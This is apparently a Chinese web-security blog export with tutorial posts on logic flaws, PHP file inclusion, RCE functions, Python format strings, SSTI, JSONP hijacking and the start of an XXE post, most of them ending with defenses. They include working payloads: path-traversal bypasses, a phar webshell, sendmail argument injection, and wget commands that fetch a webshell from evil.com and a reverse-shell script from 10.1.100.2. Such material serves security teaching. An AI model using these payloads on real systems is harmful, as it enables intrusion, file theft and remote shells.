    <content type="text"><![CDATA[常见的逻辑漏洞大概分为以下几种： 未授权 登陆与账户 越权 支付 API 未授权未授权的原因一般是由于代码未做登录验证或者登录验证失效引起，从而使后台或者带有敏感信息的页面直接裸露在公网。 常见利用方式# site在搜索引擎中，使用site:去查询相关域名信息 # 域名爆破通过爆破发现更多的二级、三级域名，然后导出域名列表通过脚本查看域名banner名称，常见的子域名列表 # 端口及banner扫描通过脚本批量获取http banner # whois信息查询如果没有设置域名隐私保护，可以通过whois查询某个域名所有人还拥有哪些域名等信息 登陆与账户常见利用方式# 弱验证码 一些可以被图像识别或者简单的图片验证码，例如这里使用了pytesseract进行了验证码识别，准确率大概80%以上，这种验证码基本等于没有 使用短位数纯数字作为手机验证码 例如4位纯数字，当用户基数很大时，在一段时间，有很多账户会使用同一验证码，通过暴力破解，可能登陆其他人的账号。（验证码不变，暴力破解账号，这样不会造成同一账号多次尝试报警） # 账号登录回显与注册该用户不存在、该用户已注册，这无疑是一个变相的撞库漏洞 # 明文密码登录使用明文或MD5及一些容易破解的加密方式作为密码加密方式 # 账号及其它个人信息篡改通过抓包方式对账号信息进行拦截，如手机号、uid、邮箱、token，篡改后提交数据包，从而达到登录别人账号的目的 # 密码重置常见的密码重置绕过方式有数字验证码绕过，比如4位数字，通过爆破进行；有的通过修改返回结果，如把false改成true。还有的可以构造密码重置链接。 越权常见利用场景订单遍历 # 前台订单 前台订单遍历指在查看订单时发现订单id为一串有规律的数字，这时可能通过变换id数字就可以查看他人订单信息了 # 后台订单 在前端展现的时候，每个用户只能查看系统分配给自己的一些订单信息。但是通过burp抓包进行fuzz时，多数都可越权查看其它账户下的订单信息，这就成了一个变相的脱裤。 # 前后端订单遍历 当我们在某外卖提交订单时，信息里面会包含一个订单号，而这个订单需要一个商家端来接单。商家端接单时可以抓包，然后就可以进行订单遍历了。当然，前提是你得有一个商家端。 商家资质遍历 商家在运营过程中，会向平台提交一些身份证、营业执照等敏感信息。一些服务端为了方便保存，直接对上传文件以用户id或者一串数字保存，这样一来可能通过改id就可获取其它商家信息。 取消订单时对订单号进行拦截篡改，从而达到取消他人订单的目的；评论时更换评论者id，从而实现恶意刷好评、差评的目的。 支付常见利用场景# 金额篡改 下单时，通过拦截篡改支付额度后提交请求，一般会看到出其不意的效果，如把订单金额改小、改成负数。造成这一现象的原因是服务器端对金额未做二次校验 # 充值 一种是少充多得，比如充值100元时通过篡改金额改成10元，最终充值完毕后账户变成了100元，而实际付款却只有10元；另一种是绕过活动页金额限制，比如很多公司做活动强制用户充值金额不能低于10000，而通过拦截修改金额，可以充值任意金额。 # 提现 提现一般也是由于服务器端参数校验不严格，会经常存在一些信息泄露、无限提款的漏洞。一般提现时，我们可以通过篡改提现额度、银行卡号来实现。防护手段是手机号、姓名、银行卡账户、额度四个统一。 API常见利用场景# 参数校验 通过改变url参数，获取到了不属于自己的返回信息，其中包含了敏感信息 # 关键参数不加密订单号、银行卡号、身份证等敏感信息，这类数据要进行hash，从而减少被直接明文越权/遍历的风险。 参考文章 常见逻辑漏洞 密码找回逻辑漏洞]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>web security</tag>
        <tag>logical vulnerability</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含漏洞利用与防御]]></title>
    <url>%2Fblog%2Ffile-inclusion%2F</url>
    <content type="text"><![CDATA[代码注入的典型代码就是文件包含(File Inclusion)，在PHP中，用于文件包含的函数有4个: 1.require require_once include include_once include和require区别主要是: include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。*_once()表示如果一个文件包含过了则不再包含，以防止变量重定义等问题。 当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析 利用场景: 具有相关的文件包含函数 文件包含函数中存在动态变量，比如 include $file; 攻击者能够控制该变量，比如$file = $_GET[&#39;file&#39;]; 分类LFI(Local File Inclusion)本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。 RFI(Remote File Inclusion)远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。但RFI的利用条件较为苛刻，需要php.ini中进行配置 allow_url_fopen = On allow_url_include = On 两个配置选项均需要为On，才能远程包含文件成功。 在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。 文件包含利用包含文件上传12$file = $_GET['page']; include $file; 我们可以先利用上传漏洞，上传我们要包含的文件在利用包含漏洞执行代码，然后利用包含漏洞指向其文件路径。 包含本地文件1view.php?file=../../../../../etc/passwd 包含木马图片1view.php?file=a.jpg a.jpg为我们上传的图片木马 包含sessionsession文件路径已知，且其中内容部分可控。 php的session文件的保存路径可以在phpinfo的session.save_path看到。 session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。 有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。 包含日志需要知道服务器日志的存储路径，且日志文件可读。 很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/ 思路是去请求一个构造的异常URL，由于会记录日志，在包含日志的时候从而发挥作用。 比如我们去请求target.com/&lt;?php phpinfo();?&gt;这个地址，将会在access.log中添加一条记录： 1[10/01/2018:12:23:45 +0800] GET /&lt;?php phpinfo();?&gt; HTTP/1.1 ...... SSH log原理同包含日志，利用的是用SSH登陆时会在/var/log/auth.log中记录是否成功: 1ssh '&lt;?php phpinfo(); ?&gt;'@remotehost 包含临时文件文章来源于这里 web上传文件，会创建临时文件。在linux下使用/tmp目录(或自定义)，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。 由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。 包含其他服务文件利用其它服务，ftp服务，数据库等，在运行过程中都会产生一些文件。 利用php伪协议利用php伪协议，可以去读取一些内容： php://input php://filter phar:// zip:// data:URI schema ftp php://input需要allow_url_include开启，比较难见。 1234target.com/1.php?page=php://inputpost data:&lt;?php phpinfo(); ?&gt; 直接将POST中的内容作为脚本运行，危害极大。 php://filterphp://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流,在XXE攻击与防御中提到的一个伪协议 常见用法是利用其将内容编解码以绕过某些保护 12php://filter/convert.base64-encode/resource=index.php 读取内容并base64加密 phar://phar是一个文件归档的包，类似于Java中的Jar文件，方便了PHP模块的迁移。php中默认安装了这个模块。 在创建phar文件的时候要注意phar.readonly这个参数要为off，否则phar文件不可写。 123456&lt;?php$p = new phar("shell.phar", 0 , "shell.phar");$p-&gt;startBuffering();$p['shell.php'] = '&lt;?php phpinfo(); @eval($_POST[x])?&gt;';$p-&gt;setStub("&lt;?php Phar::mapPhar('shell.phar'); __HALT_COMPILER?&gt;");?&gt; 运行以上代码后会在当前目录下生成一个名为shell.phar的文件，这个文件可以被include，file_get_contents等函数利用 1include 'phar://shell.phar/shell.php'; 即可被利用 有了phar文件，我们就能有一些思路了，比如上传的文件名遭到了限制，我们无法上传php的文件，但是却只能包含php文件的时候（包含文件后缀名被限制include &#39;$file&#39;.&#39;.php&#39;），我们就可以通过上传phar文件，再利用php伪协议来包含。 zip://构造zip包的方法同phar。 但使用zip协议，需要指定绝对路径，同时将#编码为%23，之后填上压缩包内的文件。 1index.php?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt data:URI schema我们可以将攻击代码转换为data:URL形式进行攻击，但是直接在URL连接中出现一些敏感字符，会导致被waf检测，所以我们需要给攻击代码进行base64编码。 123index.php?file=data:text/plain,&lt;?php system('whoami');?&gt;http://localhost/test/phar%20LFI/postinput.php?file=data:text/plain;base64,PD9waHAKcGhwaW5mbygpOwo/Pg== /proc/self/environ如果可以包含/proc/self/environ,且返回类似下面的内容： 这种情况下我们会发现其中记录了UA，所以可以构造包含: 123GET view.php?file=../../../../../proc/self/environuser-agent:&lt;?system('wget http://www.evil.com/Shells/evil.txt -O shell.php’);?&gt; 来下载webshell到web目录下 利用技巧上面的利用方式都是假设后台不对输入进行过滤或检测的情况，下面介绍一些绕过检测的技巧： 目录遍历1234&lt;?php $file = $_GET['file']; include '/var/www/html/'.$file;?&gt; 对于这种指定前缀的情况可以使用../../../xx/xxx/xxx的方式进行目录遍历 编码绕过所有注入都存在使用编码绕过的情况: 可以利用url编码 123456789../------%2e%2e%2f%2e%2e/..\-----%2e%2e\%2e%2e%5c 二次编码: 12%252e%252e%252f%252e%252e%255c 服务器/容器的编码方式: 123456../==&gt;%c0%ae%c0%ae%c0%af..\%c0%ae%c0%ae%c1%9c 下面我们来分析下为什么这样可以。 我们看到每一个字符被编码成了2个字节,以/为例，编码成了%C0 %AF，将其写成2进制1100 0000 1010 1111 是不是很熟悉？没错，是UTF-8编码。关于编码相关内容，可以看这里 2字节的UTF-8编码格式应该是110x xxxx 10xx xxxx 我们将%C0 %AF的xx位抽取出来看其Unicode值：0 0000 10 1111 = 0x2F = 47 = / 但是又有个问题，47&lt;128的， 按UTF-8 标准， ASCII范围(0-127)的Unicode值应该是用1字节去表示，但我们发现，2个字节的UTF-8通过构造也可以表示同样的内容，很正常的推测，是否统一个Unicode码值可以有多个UTF-8编码表示？(例如0-127的字符可以用1字节、2字节、3字节表示，只需要补0就可) 这就是问题所在: UTF-8 标准规定是不允许重复的(即两字节的UTF-8表示Unicode码值是U+0080-U+07FF) 如果不在这范围会报错， 但实际的库函数实现却不一定遵照标准，有时为了效率，不去检验所属范围，造成这个问题 指定后缀1234&lt;?php $file = $_GET['file']; include $file.'/test/test.php';?&gt; # 利用URL结构考虑指定后缀的情况，这时候就要去思考URL的格式了: 123协议类型:[//[访问资源需要的凭证信息@]服务器地址[:端口号]][/资源层级UNIX文件路径]文件名[?查询][#片段ID]例如http:http(s)://username:passwd@www.baidu.com:80/test/test.php?id=1#level-1 那么可以让我们利用的就是?后面的查询和#后面的fragment 除此之外，利用协议，比如phar、zip 还有一个技巧，不过需要在低版本的php下才能完成。 # 长度截断php版本 &lt; php 5.2.8目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复./即可 1index.php?file=././././。。。省略。。。././shell.txt #0字节截断php版本 &lt; php 5.3.4 1index.php?file=phpinfo.txt%00 %00 截断 PHP 内核是由 C 语言实现的，因此使用了 C 语言中的一些字符串处理函数。在连接字符串时，0 字节 (\x00) 将作为字符串的结束符。 截断后面的拼接 防御 做好文件的权限管理，禁止访问web目录之外的内容 关闭远程文件包含 避免由外界指定文件名与路径名 过滤危险字符 . /等 常见工具 LFISuite fimap [kali 自带]]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>web security</tag>
        <tag>file inclusion</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[远程代码执行利用与防御]]></title>
    <url>%2Fblog%2Fremote-code-execute%2F</url>
    <content type="text"><![CDATA[RCE(remote code execute)远程代码执行，其核心思想利用一些可以将参数作为代码执行的函数，构造恶意输入从而实施攻击。 PHP相关敏感函数常见的敏感函数如下: 1234eval()、preg_replace /e、assert、call_user_func()、call_user_func_array()、create_function()、system()、exec()、shell_exec()、passthru()、 escapeshellcmd()、pcntl_exec()还有一些文件包含等函数在文件包含相关文章中剖析，这里不再重复 eval() Evaluates the given code as PHP. 如果不进行处理的话，非常危险的一个函数。我们都很熟悉的一个页面： 123&lt;?php @eval("phpinfo();");?&gt; 最为简单的利用: 123&lt;?php@eval($_GET["eval"]);?&gt; 更进一步的利用: 123&lt;?php fputs(fopen('test.php','w+'),'&lt;?php @eval($_POST["message"])?&gt;');?&gt; 此时去访问/test.php并POST数据即可执行任意代码 preg_replace()/e 修正符使preg_replace()，将replacement 参数当做php 代码执行 php 5.5之后/e修饰符已废用 使用preg_replace_callback()函数代替 1234mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )搜索subject中匹配pattern的部分， 指定一个 callback 替代 replacement 进行替换 字符串的计算 create_function()用于创建匿名函数，例如以下函数创建一个求和函数： 1234$sum=create_function('$a,$b','return $a+$b;');echo $sum(2,3);$evil=create_function('$a,$b','$_GET["evil"]'); mail()来源于CVE-2016-10033 1bool mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]] ) 其主要的利用是其第5个参数additional_parameters: 1234The additional_parameters parameter can be used to pass additional flags as command line options to the program configured to be used when sending mail, as defined by the sendmail_path configuration setting. For example, this can be used to set the envelope sender address when using sendmail with the -f sendmail option. 其参数可以允许传递额外参数作为命令行选项，造成威胁。由于mail()函数的本质在*nix系统中是调用系统的sendmail()函数，那么可以看看手册有哪些可以利用的参数 123-X logfile是记录log文件的，就是可以写文件；-C file是临时加载一个配置文件，就是可以读文件；-O option=value 是临时设置一个邮件存储的临时目录的配置。 # 任意文件读取那么可以如下构造: 1234123@456 -C/etc/passwd -X/tmp/tmp.log最终系统执行的内容为:/usr/bin/sendmail –t –i -f 123@456 -C/etc/passwd -X/tmp/tmp.log 则这样会读取/etc/passwd内容写入tmp.log的文件中 # 任意文件写入1/usr/bin/sendmail –t –i -f 123@456 -oQ/tmp -X./shell.php 这里我们就不用知道web根目录，直接写文件到当前目录，写到shell.php文件的内容就是发送邮件的内容了，你可以写任意内容。 其他对于mail()函数的利用可以参考以下文章: 详细解析PHP mail()函数漏洞利用技巧 代码注入突破长度限制 相关技巧浅谈CTF中命令执行与绕过的小技巧 防御 尽量不要执行外部的应用程序和命令 php使用escapeshellcmd()和escapeshellarg() disable_functions中禁用 在使用诸如：eval、preg_replace、assert这些函数的时候，确定参数的内容，严格过滤危险参数。 接受的参数变量尽量用引号包裹，并在拼接前调用addslashes进行转义 检查bash破壳漏洞 检查各个反序列化命令执行漏洞 工具 tplmap 各大反序列化检测工具]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>web security</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python字符串格式化漏洞利用]]></title>
    <url>%2Fblog%2Fpython-str-format-vulnerability%2F</url>
    <content type="text"><![CDATA[python字符串格式python字符串的格式化输出有多种写法： 12345"hello %s , I'm %s" % ('Alice','Bob')"hello %(sname)s , I'm %(cname)s" % &#123;'sname':'Alice','cname':'Bob'&#125;"hello &#123;&#125;".format('Tom')"hello &#123;cname&#125;".format(cname='Tom') 举一些例子: 1234567"&#123;number:0.2f&#125;".format(number=0.5678) # 等同于 "%0.2f" % 0.5678，保留两位小数"int: &#123;0:d&#125;; hex: &#123;0:#x&#125;; oct: &#123;0:#o&#125;; bin: &#123;0:#b&#125;".format(42) # 转换进制"&#123;user.username&#125;".format(user=request.username) # 获取对象属性"&#123;arr[2]&#125;".format(arr=[0,1,2,3,4]) # 获取数组键值"&#123;:&lt;30&#125;".format('left aligned') # 左对齐并占位30个字符'&#123;:^30&#125;'.format('centered') # 居中'&#123;:*^30&#125;'.format('centered') # 用*填充 更多具体使用方式的可以参照python手册 字符串格式化漏洞如果我们控制了格式化输出字符串内容会有什么危害呢？我们发现{name}这个东西为什么那么熟悉，其实是因为他和模板的格式一致的，那么我们自然而然联想到SSTI，SSTI的其他内容可以参考这里。以Django为例: 123def view(request, *args, **kwargs): template = 'Hello &#123;user&#125;, This is your email: ' + request.GET.get('email') return HttpResponse(template.format(user=request.user)) 很明显，如果我email参数的值是: 1&#123;user.passwd&#125; 实际上就是输出了request.user.password 如果存在这个内容，就会输出密码值，是非常危险的一件事情。 漏洞利用如果我们想进一步利用这个漏洞，应该怎么做呢？假设能够获取的对象只有request.user，如何去获取django的配置项等敏感信息。 Django自带的应用“admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件 利用这一点和SSTI的方式，找到admin的model，再通过这个model获取settings对象，进而获得敏感信息。 类似的payload如下: 123http://localhost:8000/?email=&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;http://localhost:8000/?email=&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125; f修饰符与任意代码执行 PEP 498中引入了新的字符串类型修饰符：f或F，用f修饰的字符串将可以执行代码 举几个简单的例子: 12345678&gt;&gt;&gt; f"&#123;__import__('os').system('id')&#125;"uid=501(xiaokunhuang) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),701(com.apple.sharepoint.group.1),501(access_bpf),33(_appstore),100(_lpoperator),204(_developer),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)&gt;&gt;&gt; f"&#123;1+2&#125;"'3'&gt;&gt;&gt; f"hello &#123;'ali'+'ce'&#125;"'hello alice' 有一点像eval函数，但是f字符串中是自动执行的。 但有一个问题就是python中没有将普通字符串转成f字符串的方法，所以实际使用时效果不明。]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>web security</tag>
        <tag>string format</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSTI攻击分析]]></title>
    <url>%2Fblog%2Fssti%2F</url>
    <content type="text"><![CDATA[SSTI(Server-Side Template Injection) 服务端模板注入。顾名思义，服务器模板中拼接了恶意用户输入导致各种漏洞。 通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式。就拿一个销售软件来说，我们假设它会发送大量的邮件给客户，并在每封邮件前SKE插入问候语，它会通过Twig（一个模板引擎）做如下处理： 1$output = $twig-&gt;render( $_GET['custom_email'] , array("first_name" =&gt; $user.first_name) ); 除了可能存在的XSS问题，还有更深层次的隐患，我们知道Twig模板中 1&#123;&#123;content&#125;&#125; 被两个括号包裹的内容会输出其表达式的值 123custom_email=&#123;&#123;7*7&#125;&#125; // GET 参数49 // $output 结果 可以看到，服务器执行了我们传过去的数据，这时，漏洞就产生了。 漏洞探测大部分的模板语言支持我们输入 HTML: 12345678smarty=Hello &#123;user.name&#125;Hello user1 freemarker=Hello $&#123;username&#125;Hello newuser any=&lt;b&gt;Hello&lt;/b&gt;&lt;b&gt;Hello&lt;b&gt; 除了使用XSS探针外，还可以发送类似下面的payload，不同模板语法有一些差异: 12345smarty=Hello $&#123;7*7&#125;Hello 49twig=Hello &#123;&#123;7*7&#125;&#125;Hello 49 检测到模板注入漏洞后，需要准确识别模板引擎的类型，Burpsuite 则对不同模板接受的 payload 做了一个分类，并以此快速判断模板引擎： 漏洞利用读文档读模板文献构造exp，一般为以下内容： Template 使用手册，这一部分通常告诉我们基本的模板语法 通过dir去分析所有环境变量的内容，分析其可能的利用方式 内建方法，函数，变量，过滤器，使用dir或者help去分析所有对象 插件/扩展——我们可以优先研究默认开启的 探测当我们构建出了可用 exp 后，我们需要考虑我们当前环境可利用的函数/对象。除了模板默认的对象和我们提供的参数外，大部分模板引擎都有一个包含当前命名空间所有信息的对象（比如 self），或者一个可以列出所有属性和方法的函数。 如果没有这样的对象或函数，我们需要暴力枚举变量名。 利用根据不同环境和可以用信息的不同，用模板注入来实现任意对象创建，任意文件读写，远程文件包含，信息泄露以及提权等。 漏洞利用时，除了传统的XSS漏洞，SSTI主要关注的是后台代码注入，通过对对象、上下文环境的利用，来构造出恶意程序。 以flask &amp; jinjia2模板为例：对相关环境变量对象的分析与研究，学者们发现了一些对象的利用方式: request.environ可以获取到服务器的环境变量，werkzeug.server.shutdown可以用于关闭服务器造成Dos攻击。 config对象： It is a dictionary-like object that contains all of the configuration values for the application. In most cases, this includes sensitive values such as database connection strings, credentials to third party services, the SECRET_KEY, etc. Viewing these configuration items is as easy as injecting a payload of `` config对象有4个方法:from_envvar, from_object, from_pyfile, and root_path 任意文件读取获取object对象的所有子类引用列表 1http://test.com/&#123;&#123;”.__class__.__mro__[2].__subclasses__()&#125;&#125; 选取其中file类对象，创建其实例，并传入参数 1http://10.1.100.3:5000/&#123;&#123;”.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()&#125;&#125; 实现了任意文件读取 任意文件写入1http://test.com/&#123;&#123;”.__class__.__mro__[2].__subclasses__()[40]('/tmp/tmp.txt', 'w').write('123')&#125;&#125; 远程代码执行来源于这篇文章 其首先写入了一个tmp.cfg文件 1http://test.com/&#123;&#123;”.__class__.__mro__[2].__subclasses__()[40]('/tmp/tmp.cfg', 'w').write('from subprocess import check_output\n\n RUNCMD = check_output\n')&#125;&#125; 之后，利用Flask Template Globals 中的config上下文对象导入py代码，from_pyfile 用于导入指定的py文件，然后将导入的py文件中的大写成员属性加入到config这个上下文对象中，这也是为什么RUNCMD要用大写的原因：所以可以使用 1http://test.com/&#123;&#123;config.from_pyfile('/tmp/tmp.cfg')&#125;&#125; 再利用注入的RUNCMD 执行系统命令下载反弹shell 1http://test.com/&#123;&#123;config['RUNCMD'](‘/usr/bin/wget http://10.1.100.2/backShell.py -O /tmp/x’, shell=True)&#125;&#125; python在导入模块的同时也会执行脚本中部分代码（class 和方法的定义不会执行），利用这一点，就可以执行反弹shell 了: 1http://test.com/&#123;&#123;config.from_pyfile(‘/tmp/x’)&#125;&#125; 具体案例: Jinja2 template injection filter bypasses Exploring SSTI in Flask/Jinja2 Flask Jinja2开发中遇到的的服务端注入问题研究 Server-Side Template Injection: RCE for the modern webapp Exploiting Python Code Injection in Web Applications 工具 tplmap]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>web security</tag>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JSONP注入利用与防御]]></title>
    <url>%2Fblog%2Fjsonp%2F</url>
    <content type="text"><![CDATA[JSONP基础JSONP(JSON with Padding) 其目的是为了绕过诸如同源策略强制执行XMLHttpRequest(AJAX requests)去请求JSON数据。举个例子: 网站A: www.competition.com 提供赛事信息 其接口 competition.com/data.json 以json格式返回了赛事数据,其分析子站B: analysis.competition.com 根据赛事信息进行分析 并展示给用户 那么B站的ajax想要获取data怎么做？ 答案是很困难的，普通的ajax是无法完成的 因为ajax遵守同源策略，A、B是异源，异源资源共享通常是不允许的(除了脚本、链接等 详情可以看同源策略这篇文章) 那么怎么办呢？ 我们可以发现，同源策略是允许跨域加载脚本的，我们的思路就是把数据放进js文件中，由于跨域脚本嵌入是可行的，从而跨域加载数据，但直接把json数据方式js文件格式是不正确的，我们的思路是设置一个函数调用，把json数据作为实参传递进来，然后在B中对形参进行处理，这样就跨域获取到了json数据。即script标签不受同源安全策略限制，它可以向别的域发送get请求。 举个例子： 12345678910111213我们要在B站请求A站这个json数据:&#123;"id" : "1","name" : "隔壁老王"&#125;那么我们在A站www.competition.com/data.js内容如下：callback(&#123;"id" : "1","name" : "隔壁老王"&#125;);由此，只需要在B站加载此js，然后构造此函数的处理即可：function callback(data)&#123; alert(data.name);&#125;如果A站要根据需要同时提供不同的json数据，硬编码或每一个都写成一个js是肯定不行的，这时候可以将需求作为参数传递过去。 我们以程序员的角度来考虑，整个系统应该怎么编写，这样可以更好的帮助我们理解数据交换流程：首先，定义一个用于接收数据的回调函数： 123function myData(data) &#123; console.log(' DATA: ', data);&#125; 然后我们用&lt;script&gt;标签去跨域请求数据： 1&lt;script src="http://root.cool/userinfo?fn=myData"&gt;&lt;/script&gt; 当获取完如上url的内容后，会自动解释成js代码执行。由此来看，以上url访问输出的结果类似如下: 1myData([&#123;nickname: 'empty_xl', blog: 'https://hellohxk.com'&#125;]) 一般后台会根据fn参数返回相应名称的函数，类似下面的方式： 12345&lt;?php//getUsers.php$callback = $_GET['callback'];print $callback.'(&#123;"nickname" : "1","blog" : "https://hellohxk.com"&#125;);';?&gt; JSONP 利用JSON劫持即JSON Hijacking 其实属于CSRF攻击的范围，当某网站使用JSONP传递敏感数据的时候，攻击者可以构造恶意JSONP调用界面，诱导被攻击者访问。 当我们找到一个jsonp接口且返回数据包含敏感信息时，我们可以在一个访问量高的站点或者自己博客插入一段js，去跨域加载这个jsonp接口，如果访问者之前登陆过(有cookie信息)，则可以批量获取重要信息: 例如 我们在我们博客中加上这段内容123456&lt;script&gt;function evil(v)&#123; alert(v);&#125;&lt;/script&gt;&lt;script src="http://aim.com/?callback=evil"&gt;&lt;/script&gt; 而aim.com这个jsonp接口返回的信息又包含敏感信息: 1evil('username:test passwd:dfsjk1s'); 当有用户访问我们博客且之前在aim.com登陆过时，则可以批量劫持敏感信息。 这类攻击常见的防御方式是判断reference是否为可信来源或添加随机值，但存在reference伪造(qq.com.evil.com)、空reference、暴力穷举等问题，最有效的方式还是综合防御(判断reference和添加随机字串)，或使用加在url中的token可以完美解决。 callback函数可定义的安全问题根据上面的内容，我们可以看到，callback函数的名称可以自定义，而输出环境又是js环境，如果没有严格过滤或审查，可以引起很多其他的攻击方式。 比如后台使用$callback = $_GET[&#39;callback&#39;];print $callback.&#39;(data)&#39;;这样子，认为callback是可信的，而攻击者完全可以将alert(/xss/)作为callback参数传递进去。 这种问题有两种解决方案： #严格定义 Content-Type: application / json这样的防御机制导致了浏览器不解析恶意插入的 XSS 代码 #过滤 callback 以及 JSON 数据输出这样的防御机制是比较传统的攻防思维，对输出点进行 xss 过滤。 基础函数调用如果我们的回调函数被硬编码进响应(即多个不同类型的请求都采用同样的回调函数名，例如callback等)，那么就会存在基础函数调用的危害。 JSONP 漏洞挖掘可以去搜索callback、.json关键字 利用搜索引擎12inurl:.jsoninurl:callback= 防御 调用JSON文件限制Refererence 、部署一次性 Token在url中(QQ这么做的·http://r.qzone.qq.com/cgi-bin/tfriend/friend_show_qqfriends.cgi?uin=[QQ号码]&amp;g_tk=[随机token]) 严格暗账 JSON 格式标准输出Content-Type及编码（ Content-Type : application/json; charset=utf-8) 阻值了返回当成js执行的可能 严格过滤callback函数名及JSON里数据的输出 按照xss过滤 严格限制对 JSONP 输出callback函数名的长度，函数调用名不可预测]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>web security</tag>
        <tag>jsonp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XXE利用与防御]]></title>
    <url>%2Fblog%2Fxxe%2F</url>
    <content type="text"><![CDATA[XML 简介XML 即 可扩展标记语言（EXtensible Markup Language），是一种标记语言，其标签没有预定义，您需要自行定义标签，是W3C的推荐标准。其于HTML的区别是： HTML 被设计用来显示数据 XML 被设计用来传输和存储数据 XML作用 数据分离 如果你需要在HTML文档中显示动态数据，那么每当数据改变时将花费大量的时间来编辑HTML。通过XML，数据能够存储在独立的XML文件中。这样你就可以专注于使用HTML进行布局和显示，并确保修改底层数据不再需要对HTML进行任何的改变。通过使用几行JavaScript，你就可以读取一个外部XML文件，然后更新HTML中的数据内容。 简化数据共享 在真实的世界中，计算机系统和数据使用不兼容的格式来存储数据。XML数据以纯文本格式进行存储，因此提供了一种独立于软件和硬件的数据存储方法。这让创建不同应用程序可以共享的数据变得更加容易。 XML结构123456789101112131415161718192021&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;bookstore&gt;&lt;book category="COOKING"&gt; &lt;title lang="en"&gt;Everyday Italian&lt;/title&gt; &lt;author&gt;Giada De Laurentiis&lt;/author&gt; &lt;year&gt;2005&lt;/year&gt; &lt;price&gt;30.00&lt;/price&gt; &lt;/book&gt;&lt;book category="CHILDREN"&gt; &lt;title lang="en"&gt;Harry Potter&lt;/title&gt; &lt;author&gt;J K. Rowling&lt;/author&gt; &lt;year&gt;2005&lt;/year&gt; &lt;price&gt;29.99&lt;/price&gt; &lt;/book&gt;&lt;book category="WEB"&gt; &lt;title lang="en"&gt;Learning XML&lt;/title&gt; &lt;author&gt;Erik T. Ray&lt;/author&gt; &lt;year&gt;2003&lt;/year&gt; &lt;price&gt;39.95&lt;/price&gt; &lt;/book&gt;&lt;/bookstore&gt; XML特性 所有 XML 元素都须有关闭标签 标签对大小写敏感 必须正确地嵌套 文档必须有根元素 XML的属性值须加引号 实体引用，一些特殊字符(&lt;&gt;&amp;&#39;&quot;需要转义) 注释使用&lt;!--xxx--&gt; 空格会被保留 不同系统换行存储不一样(win下\r\n，*inx下\n) 元数据（有关数据的数据）应当存储为属性，而数据本身应当存储为元素 XSLT 是首选的XML样式表语言 123456789101112 &lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;?xml-stylesheet type="text/xsl" href="simple.xsl"?&gt;&lt;breakfast_menu&gt; &lt;food&gt; &lt;name&gt;Belgian Waffles&lt;/name&gt; &lt;price&gt;$5.95&lt;/price&gt; &lt;description&gt; two of our famous Belgian Waffles &lt;/description&gt; &lt;calories&gt;650&lt;/calories&gt; &lt;/food&gt;&lt;/breakfast_menu&gt; XMLHttpRequestXMLHttpRequest对象用于在后台与服务器交换数据，XMLHttpRequest: 在不重新加载页面的情况下更新网页 在页面已加载后从服务器请求数据 在页面已加载后从服务器接收数据 在后台向服务器发送数据 DTD文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。 DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。 12345678910111213141516171819202122232425262728&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE note [ &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt;]&gt;&lt;note&gt; &lt;to&gt;George&lt;/to&gt; &lt;from&gt;John&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don't forget the meeting!&lt;/body&gt;&lt;/note&gt;-----!DOCTYPE note (第二行)定义此文档是 note 类型的文档。!ELEMENT note 